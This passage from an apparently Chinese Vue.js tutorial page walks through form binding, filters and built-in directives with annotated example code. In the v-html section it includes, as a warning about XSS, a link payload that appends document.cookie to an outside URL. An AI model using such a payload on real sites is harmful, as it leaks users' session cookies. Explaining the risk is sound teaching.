class="comment">1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）</span></span><br><span class="line"><span class="comment">2.配置input的value属性:</span></span><br><span class="line"><span class="comment">(1)v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）</span></span><br><span class="line"><span class="comment">(2)v-model的初始值是数组，那么收集的的就是value组成的数组</span></span><br><span class="line"><span class="comment">备注：v-model的三个修饰符：</span></span><br><span class="line"><span class="comment">lazy：失去焦点再收集数据</span></span><br><span class="line"><span class="comment">number：输入字符串转为有效的数字</span></span><br><span class="line"><span class="comment">trim：输入首尾空格过滤</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">想文本和input关联起来，可以使用</span></span><br><span class="line"><span class="comment">&lt;label for=&quot;demo&quot;&gt;账号：&lt;/label&gt;:for是一个标识符</span></span><br><span class="line"><span class="comment">&lt;input type=&quot;text&quot; id=&quot;demo&quot;&gt;:通过id引用label标签中的for标识符，就关联起来了</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> @<span class="attr">submit.prevent</span>=<span class="string">&quot;demo&quot;</span>&gt;</span></span><br><span class="line">        账号：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model.trim</span>=<span class="string">&quot;userInfo.account&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;userInfo.password&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        年龄：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span> <span class="attr">v-model.number</span>=<span class="string">&quot;userInfo.age&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        性别：</span><br><span class="line">        男<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;userInfo.sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;male&quot;</span>&gt;</span></span><br><span class="line">        女<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;userInfo.sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;female&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        爱好：</span><br><span class="line">        学习<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;userInfo.hobby&quot;</span> <span class="attr">value</span>=<span class="string">&quot;study&quot;</span>&gt;</span></span><br><span class="line">        打游戏<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;userInfo.hobby&quot;</span> <span class="attr">value</span>=<span class="string">&quot;game&quot;</span>&gt;</span></span><br><span class="line">        吃饭<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;userInfo.hobby&quot;</span> <span class="attr">value</span>=<span class="string">&quot;eat&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        所属校区</span><br><span class="line">        <span class="tag">&lt;<span class="name">select</span> <span class="attr">v-model</span>=<span class="string">&quot;userInfo.city&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span>请选择校区<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;beijing&quot;</span>&gt;</span>北京<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;shanghai&quot;</span>&gt;</span>上海<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;shenzhen&quot;</span>&gt;</span>深圳<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;wuhan&quot;</span>&gt;</span>武汉<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        其他信息：</span><br><span class="line">        <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">v-model.lazy</span>=<span class="string">&quot;userInfo.other&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;userInfo.agree&quot;</span>&gt;</span>阅读并接受<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.atguigu.com&quot;</span>&gt;</span>《用户协议》<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line">            userInfo:&#123;</span><br><span class="line"><span class="javascript">                account:<span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                password:<span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line">                age:18,</span><br><span class="line"><span class="javascript">                sex:<span class="string">&#x27;female&#x27;</span>,</span></span><br><span class="line">                hobby:[],</span><br><span class="line"><span class="javascript">                city:<span class="string">&#x27;beijing&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                other:<span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                agree:<span class="string">&#x27;&#x27;</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">demo</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="built_in">JSON</span>.stringify(<span class="built_in">this</span>.userInfo))</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">过滤器：</span></span><br><span class="line"><span class="comment">定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。</span></span><br><span class="line"><span class="comment">语法：</span></span><br><span class="line"><span class="comment">1.注册过滤器：Vue.filter(name,callback) 或 new Vue&#123;filters:&#123;&#125;&#125;</span></span><br><span class="line"><span class="comment">2.使用过滤器：&#123;&#123; xxx | 过滤器名&#125;&#125;  或  v-bind:属性 = &quot;xxx | 过滤器名&quot;</span></span><br><span class="line"><span class="comment">备注：</span></span><br><span class="line"><span class="comment">1.过滤器也可以接收额外参数、多个过滤器也可以串联</span></span><br><span class="line"><span class="comment">2.并没有改变原本的数据, 是产生新的对应的数据</span></span><br><span class="line"><span class="comment">3.全局的东西，所有组件都可以使用</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">官网：https://www.bootcdn.cn/</span></span><br><span class="line"><span class="comment">Moment.js：是一个 JavaScript 日期处理类库，用于解析、检验、操作、以及显示日期。</span></span><br><span class="line"><span class="comment">Day.js：是一个轻量的处理时间和日期的 JavaScript 库，和 Moment.js 的 API 设计保持完全一样. 如果您曾经用过 Moment.js, 那么您已经知道如何使用 Day.js</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/dayjs.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>显示格式化后的时间<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 计算属性实现 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>现在是：&#123;&#123;fmtTime&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- methods实现 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>现在是：&#123;&#123;getFmtTime()&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 过滤器实现 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>现在是：&#123;&#123;time | timeFormater&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 过滤器实现（传参） --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>现在是：&#123;&#123;time | timeFormater(&#x27;YYYY_MM_DD&#x27;) | mySlice&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span> <span class="attr">:x</span>=<span class="string">&quot;msg | mySlice&quot;</span>&gt;</span>尚硅谷<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root2&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;msg | mySlice&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//全局过滤器</span></span></span><br><span class="line"><span class="javascript">    Vue.filter(<span class="string">&#x27;mySlice&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">value</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> value.slice(<span class="number">0</span>,<span class="number">4</span>)</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="javascript">            time:<span class="number">1621561377603</span>, <span class="comment">//时间戳</span></span></span><br><span class="line"><span class="javascript">            msg:<span class="string">&#x27;你好，尚硅谷&#x27;</span></span></span><br><span class="line">        &#125;,</span><br><span class="line">        computed: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">fmtTime</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">return</span> dayjs(<span class="built_in">this</span>.time).format(<span class="string">&#x27;YYYY年MM月DD日 HH:mm:ss&#x27;</span>)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">getFmtTime</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">return</span> dayjs(<span class="built_in">this</span>.time).format(<span class="string">&#x27;YYYY年MM月DD日 HH:mm:ss&#x27;</span>)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="comment">//局部过滤器</span></span></span><br><span class="line">        filters:&#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">timeFormater</span>(<span class="params">value,str=<span class="string">&#x27;YYYY年MM月DD日 HH:mm:ss&#x27;</span></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="comment">// console.log(&#x27;@&#x27;,value)</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">return</span> dayjs(value).format(str)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h1><p><strong>cookie实现原理</strong></p><p><img src="image-20220420100543958.png" alt=""></p><p><img src="image-20220420101047063.png" alt=""></p><h1 id="内置指令"><a href="#内置指令" class="headerlink" title="内置指令"></a>内置指令</h1><h3 id="v-text"><a href="#v-text" class="headerlink" title="v-text"></a>v-text</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">v-text指令：</span></span><br><span class="line"><span class="comment">1.作用：向其所在的节点中渲染文本内容。</span></span><br><span class="line"><span class="comment">2.与插值语法的区别：v-text会替换掉节点中的内容，&#123;&#123;xx&#125;&#125;则不会。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-text</span>=<span class="string">&quot;name&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="v-html"><a href="#v-html" class="headerlink" title="v-html"></a>v-html</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">v-html指令：</span></span><br><span class="line"><span class="comment">1.作用：向指定节点中渲染包含html结构的内容。</span></span><br><span class="line"><span class="comment">2.与插值语法的区别：</span></span><br><span class="line"><span class="comment">(1).v-html会替换掉节点中所有的内容，&#123;&#123;xx&#125;&#125;则不会。</span></span><br><span class="line"><span class="comment">(2).v-html可以识别html结构。</span></span><br><span class="line"><span class="comment">3.严重注意：v-html有安全性问题！！！！</span></span><br><span class="line"><span class="comment">(1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。</span></span><br><span class="line"><span class="comment">(2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>你好，&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-html</span>=<span class="string">&quot;str&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-html</span>=<span class="string">&quot;str2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="javascript">            name:<span class="string">&#x27;尚硅谷&#x27;</span>,</span></span><br><span class="line"><span class="javascript">            <span class="comment">// 可以</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            str:&#x27;<span class="tag">&lt;<span class="name">h3</span>&gt;</span>你好啊！<span class="tag">&lt;/<span class="name">h3</span>&gt;</span>&#x27;,</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">// 不能这么写，很危险，会暴露自己的cookie</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            str2:&#x27;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:location.href</span>=<span class="string">&quot;http://www.baidu.com?&quot;</span>+<span class="attr">document.cookie</span>&gt;</span>兄弟我找到你想要的资源了，快来！<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&#x27;,</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="v-cloak"><a href="#v-cloak" class="headerlink" title="v-cloak"></a>v-cloak</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">v-cloak指令（没有值）：</span></span><br><span class="line"><span class="comment">1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。</span></span><br><span class="line"><span class="comment">2.使用css配合v-cloak可以解决网速慢时页面展示出&#123;&#123;xxx&#125;&#125;的问题。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-attr">[v-cloak]</span>&#123;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">display</span><span class="selector-pseudo">:none</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 请求数据的过程中有延迟，导致显示&#123;&#123;name&#125;&#125;很不好看，可以利用v-cloak，先把有v-cloak的属性通过css隐藏起来，数据请求回来后，容器被Vue实例接管后，v-cloak属性会自动删除，然后css就不起作用了，然后正常的显示数据 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-cloak</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="v-once"><a href="#v-once" class="headerlink" title="v-once"></a>v-once</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">v-once指令：</span></span><br><span class="line"><span class="comment">1.v-once所在节点在初次动态渲染后，就视为静态内容了。</span></span><br><span class="line"><span class="comment">2.以后数据的改变不会引起v-once所在元素结构（内容）的更新，可以用于优化性能。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-once</span>&gt;</span>初始化的n值是:&#123;&#123;n&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>当前的n值是:&#123;&#123;n&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;n++&quot;</span>&gt;</span>点我n+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="v-pre"><a href="#v-pre" class="headerlink" title="v-pre"></a>v-pre</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">v-pre指令：</span></span><br><span class="line"><span class="comment">1.跳过其所在节点的编译过程。</span></span><br><span class="line"><span class="comment">2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- vue实例遇到有v-pre指令不去解析该元素的结构，而是拿去直接显示在页面上，不做任何的处理 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-pre</span>&gt;</span>Vue其实很简单<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> &gt;</span>当前的n值是:&#123;&#123;n&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;n++&quot;</span>&gt;</span>点我n+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="自定义组件"><a href="#自定义组件" class="headerlink" title="自定义组件"></a>自定义组件</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。</span></span><br><span class="line"><span class="comment">需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。</span></span><br><span class="line"><span class="comment">自定义指令总结：</span></span><br><span class="line"><span class="comment">一、定义语法：</span></span><br><span class="line"><span class="comment">(1).局部指令：</span></span><br><span class="line"><span class="comment">new Vue(&#123;new Vue(&#123;</span></span><br><span class="line"><span class="comment">directives:&#123;指令名:配置对象&#125;   或   directives&#123;指令名:回调函数&#125;</span></span><br><span class="line"><span class="comment">&#125;) &#125;)</span></span><br><span class="line"><span class="comment">(2).全局指令：</span></span><br><span class="line"><span class="comment">Vue.directive(指令名,配置对象) 或   Vue.directive(指令名,回调函数)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">二、配置对象中常用的3个回调：</span></span><br><span class="line"><span class="comment">(1).bind：指令与元素成功绑定时调用。</span></span><br><span class="line"><span class="comment">(2).inserted：指令所在元素被插入页面时调用。</span></span><br><span class="line"><span class="comment">(3).update：指令所在模板结构被重新解析时调用。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">三、备注：</span></span><br><span class="line"><span class="comment">1.指令定义时不加v-，但使用时要加v-；</span></span><br><span class="line"><span class="comment">2.指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>放大10倍后的n值是:<span class="tag">&lt;<span class="name">span</span> <span class="attr">v-big</span>=<span 